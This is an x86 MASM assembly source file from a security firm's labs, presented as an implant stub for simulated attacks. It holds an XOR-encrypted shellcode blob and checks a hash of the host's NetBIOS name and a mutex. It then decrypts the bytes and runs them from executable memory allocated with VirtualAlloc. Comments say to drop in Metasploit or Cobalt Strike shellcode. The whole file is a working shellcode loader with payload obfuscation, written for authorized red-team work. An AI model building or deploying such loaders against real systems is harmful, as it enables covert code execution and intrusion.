; -----------------------------------------------------------------------------
; 
;  Implant Stub Code - MASM EXE
;  (C) 2016 Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
;  MWR InfoSecurity Ltd, MWR Labs
;
;  This code is designed to act as a basis for safer implants during simulated
;  attacks. 
;
;  Compile this by running 'makeit.bat' from the same drive as a masm32 installation.
; 
; -----------------------------------------------------------------------------

.586
.model flat,stdcall
option casemap:none

; -----------------------------------------------------------------------------
;  These includes are needed for the compiler and linker
; -----------------------------------------------------------------------------

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\advapi32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib           
includelib \masm32\lib\advapi32.lib           

; -----------------------------------------------------------------------------
;  MASM works by single-pass, so all functions need to be declared
;  in advance so that the lexcial analyser will work properly
; -----------------------------------------------------------------------------

CheckExecution PROTO 
MutexCheck PROTO
ExecuteShellcode PROTO
GetComputerInfo PROTO :DWORD
GenerateHash PROTO :DWORD,:DWORD

.data         
                     
; Had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
; and some experimentation. You shouldn't need to change this.
CNF_ComputerNamePhysicalNetBIOS           equ 4
CNF_ComputerNamePhysicalDnsHostname       equ 5
CNF_ComputerNamePhysicalDnsDomain         equ 6
CNF_ComputerNamePhysicalDnsFullyQualified equ 7

; From https://msdn.microsoft.com/en-us/library/windows/desktop/aa375549%28v=vs.85%29.aspx
; It identifies the constant needed to request a SHA1 hash from the Crypto API
MS_CALG_SHA1 equ 8004h    
MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)

; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
strMutexName  db  "Global\Stufus",0    

; The hash of the authorised NetBIOS computer name. Change this to the real hash.
; You can generate this with raw2src.py or manually if you prefer
hashSHA1CompterName db 53h,8Fh,68h,0F9h,2Ch,0A3h,76h,0E5h,23h,0E6h,0D6h,0A9h,68h,63h,0DEh,02h,7Dh,76h,0A3h,0DAh

; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
; You can generate this with raw2src.py or manually if you prefer
shellcode db 147,165,198,182,210,135,155,91,24,126,158,229,50,116,166,138,30,246,101,35
          db 193,56,65,228,224,171,228,20,234,71,223,236,180,8,88,8,119,124,194,208
          db 171,46,214,3,130,135,228,47,246,71,189,252,131,17,199,112,100,101,152,117
          db 106,79,182,140,146,234,228,94,65,205,7,229,4,33,237,7,130,249,211,91
          db 77,143,146,98,167,100,132,158,241,176,205,252,142,241,166,161,10,124,248,73
          db 193,66,22,228,252,191,110,129,65,200,98,213,19,153,105,223,50,28,208,157
          db 66,103,137,230,67,42,173,2,68,130,231,56,169,248,178,4,209,130,154,106
          db 78,245,35,183,68,208,232,118,238,158,1,90,4,239,210,114,107,117,123,67
          db 38,110,28,7,149,145,65,14,162,185,154,177,137,32,246,115,114,89,25,166
          db 172,24,162,58,162,42,173,58,113,100,75,153,71,151,49,223,124,149,76,208
          db 181,177,53,28,254,131,79,2,234,128,136,182,147,48,96,172,124,21,102,92
          db 106,97,53,60,210,214,9,91,17,68,181,240,234,153,206,147,118,93,51,15
          db 34,110,51,0,209,203,1,3,164,171,129,244,137,101,67,147,74,93,113,74
          db 34,57,50,26,202,203,14,4,190,236,129,189,150,96,65,147,122,21,118,15
          db 123,135,213,35,130,131,230,139,251,30,131,148,168,65,127,4,254,76,211,127
          db 181,27,85
shellcodelen  equ  303

.data?
            
.code 
stufus:

; -----------------------------------------------------------------------------
;  Entry point
; -----------------------------------------------------------------------------
 
invoke CheckExecution       ; This does the main work
invoke ExitProcess, NULL    ; Exit cleanly when the time comes



; -----------------------------------------------------------------------------
; 
;  CheckExecution
;  This function does all of the work; it will go through the relevant checks
;  and execute the shellcode if they all pass.
; 
; -----------------------------------------------------------------------------

CheckExecution PROC uses esi edi

 ; ============================================================================
 ; 
 ; CHECK 1: NETBIOS NAME vs STORED HASH
 ;
 ; ============================================================================

 ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
 invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
 mov esi, eax           ; Contains the raw computer name
 invoke lstrlen, esi    
 mov ecx, eax           ; Contains the length of the raw computer name
 invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the computer name
 mov edi, eax           ; Contains the hash of the raw computer name
 invoke GlobalFree, esi ; Free the NETBIOS name buffer

 ; Now compare the hash of the name of the host against the stored hash
 push edi               ; Store a pointer to the raw computer name hash so we can clear it later
 mov ecx, MS_CALG_SHA1_HASHSIZE ; ecx = length of the hash
 cld                            ; Clear the direction flag (i.e. left-to-right comparison)
 mov esi, offset hashSHA1CompterName ; The calculated hash is in edi, the stored hash is now in esi
 repz cmpsb                     ; Compare [esi] and [edi] up to 'ecx' times :-)
 jnz badhash                    ; If they are different, the hash was incorrect



 ; ============================================================================
 ; 
 ; CHECK 2: MUTEX
 ;
 ; ============================================================================

 ; Check to see whether the implant is already running or not
 invoke MutexCheck   ; Perform the mutex check
 test eax, eax       ; If return value is 0, don't continue
 jz done



 ; ============================================================================
 ; 
 ; CHECK 3: XORing shellcode against hash of domain name
 ;
 ; ============================================================================

 ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
 invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
 mov esi, eax           ; Contains the raw computer name
 invoke lstrlen, esi    
 mov ecx, eax           ; Contains the length of the FQDN
 invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the FQDN
 mov edi, eax           ; Contains the hash of the FQDN
 invoke GlobalFree, esi ; Free the buffer

 ; Now loop through the shellcode xoring it with the hash values (repeating hash
 ; values if necessary)
 ; ecx = The loop counter (i.e. position in the shellcode)
 ; edi = Pointer to the hash
 ; eax = The position in the hash
 ; esi = Pointer to the shellcode
 ; edx = 'Working' register (to store the current character)
 mov ecx, 0
 mov eax, 0
 mov esi, offset shellcode
 xor edx, edx

startloop:
 mov dh, byte ptr [esi+ecx]
 xor dh, byte ptr [edi+eax]
 mov byte ptr [esi+ecx], dh 
 .if eax==MS_CALG_SHA1_HASHSIZE-1      ; If we are at the end of the hash, start again
    xor eax, eax
 .else
    inc eax
 .endif
 .if ecx<shellcodelen                ; If we are at the end of the shellcode, its done
    inc ecx
    jmp startloop                    ; If not, increase the counter by one and start again
 .endif
 invoke GlobalFree, edi              ; Free the hash buffer


 ; ============================================================================
 ; 
 ; Finally execute the shellcode
 ;
 ; ============================================================================

 invoke ExecuteShellcode

; If the hash was incorrect, jump here because we
; need to free the generated hash memory
badhash:
 pop edi
 invoke GlobalFree, edi

done:
 ret
    
CheckExecution ENDP



; -----------------------------------------------------------------------------
; 
;  GetComputerInfo
;  This function retrieves information about the computer (e.g. its name)
;  and returns a buffer to it. Caller needs to free it when done.
; 
; -----------------------------------------------------------------------------

GetComputerInfo PROC uses esi reqinfo:DWORD
LOCAL lsize:DWORD

    mov lsize, 0
    invoke GetComputerNameEx, reqinfo, NULL, addr lsize ; Find out how large this string actually is
    inc lsize
    invoke GlobalAlloc, GPTR, lsize                     ; Allocate the memory needed to store the name
    test eax, eax                                       ; Make sure the function worked
    jz done
    mov esi, eax
    invoke GetComputerNameEx, reqinfo, esi, addr lsize  ; Actually retrieve it
    test eax, eax
    jz done
    mov eax, esi 
done:
    ret
GetComputerInfo ENDP



; -----------------------------------------------------------------------------
; 
;  MutexCheck
;  This function attempts to create the mutex stored in 'strMutexName'. It will
;  return 0 in eax if the mutex already existed and return -1 if it did not.
;
;  0 = Don't go any further, its already running.
;  1 = Continue execution.
; 
; -----------------------------------------------------------------------------

MutexCheck PROC 
 invoke CreateMutex, NULL, TRUE, addr strMutexName
 .if eax==NULL
      xor eax, eax
      ret
 .else
      invoke GetLastError
      .if eax==ERROR_ALREADY_EXISTS
          xor eax, eax
          ret
      .else
          mov eax, -1
          ret
      .endif
 .endif
MutexCheck ENDP



; Generate hash using CryptoAPI
GenerateHash PROC uses esi ptrString:DWORD,stringlength:DWORD
LOCAL hProv:DWORD
LOCAL hHash:DWORD
LOCAL dwHashSize:DWORD
LOCAL dwHashSizeLen:DWORD

 mov dwHashSizeLen, 4 ; 32-bit :)
 invoke CryptAcquireContext, addr hProv, NULL, NULL, PROV_RSA_AES, NULL
 .if eax!=NULL
   invoke CryptCreateHash, hProv, MS_CALG_SHA1, NULL, NULL, addr hHash
   .if eax!=NULL
     invoke CryptHashData,hHash, ptrString, stringlength, NULL
     .if eax!=NULL
       invoke CryptGetHashParam, hHash, HP_HASHSIZE, addr dwHashSize, addr dwHashSizeLen, NULL
       .if eax!= NULL
         invoke GlobalAlloc, GPTR, dwHashSize
         .if eax!=NULL
           mov esi, eax
           invoke CryptGetHashParam, hHash, HP_HASHVAL, esi, addr dwHashSize, NULL
           .if (eax!=NULL && dwHashSize==MS_CALG_SHA1_HASHSIZE)
             mov eax, esi  ; Hash is now stored in esi
           .endif
         .endif
       .endif 
     .endif
     push eax
     invoke CryptDestroyHash, hHash
     pop eax
   .endif
   push eax
   invoke CryptReleaseContext, hProv, NULL
   pop eax
 .endif
 ret
GenerateHash ENDP



; -----------------------------------------------------------------------------
; 
;  ExecuteShellcode
;  This function will execute the shellcode provided
; 
; -----------------------------------------------------------------------------

ExecuteShellcode PROC uses esi edi
  ; Allocate the memory for the shellcode
  invoke VirtualAlloc, NULL, shellcodelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE
  .if eax!=0
    mov edi, eax
    push eax
    mov esi, offset shellcode
    mov ecx, shellcodelen
    cld
    rep movsb
    pop edx
    call edx ; The shellcode should take over from here
  .endif
ExecuteShellcode ENDP

End stufus
